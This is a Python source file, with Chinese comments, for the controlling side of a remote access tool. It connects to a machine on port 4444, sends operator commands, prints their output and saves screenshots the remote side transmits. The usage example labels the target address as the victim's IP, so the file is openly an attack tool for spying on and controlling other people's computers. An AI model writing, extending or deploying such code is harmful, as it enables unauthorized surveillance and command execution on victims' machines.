import socket
import time

class RemoteControlClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.sock.connect((self.host, self.port))
            print(f"[*] 成功连接到 {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"连接失败: {e}")
            return False

    def send_command(self, command):
        try:
            self.sock.sendall(command.encode())
            
            if command.strip() == 'screenshot':
                return self._receive_file()
            else:
                return self._receive_output()
        except Exception as e:
            return f"命令执行失败: {str(e)}"

    def _receive_output(self):
        output = ''
        while True:
            data = self.sock.recv(1024).decode()
            if not data:
                break
            output += data
        return output

    def _receive_file(self):
        try:
            data = self.sock.recv(1024)
            if data == b"START_FILE_TRANSFER":
                filename = f"screenshot_{int(time.time())}.png"
                with open(filename, 'wb') as f:
                    while True:
                        data = self.sock.recv(1024)
                        if data.endswith(b"EOF"):
                            f.write(data[:-3])
                            break
                        f.write(data)
                return f"截图已保存至 {filename}"
            else:
                return data.decode()
        except Exception as e:
            return f"文件接收失败: {str(e)}"

    def close(self):
        if self.sock:
            self.sock.close()

if __name__ == "__main__":
    # 使用示例
    client = RemoteControlClient('192.168.1.108', 4444)  # 替换为受害者IP
    if client.connect():
        while True:
            cmd = input("remote> ")
            if cmd.lower() in ['exit', 'quit']:
                break
            print(client.send_command(cmd))
        client.close()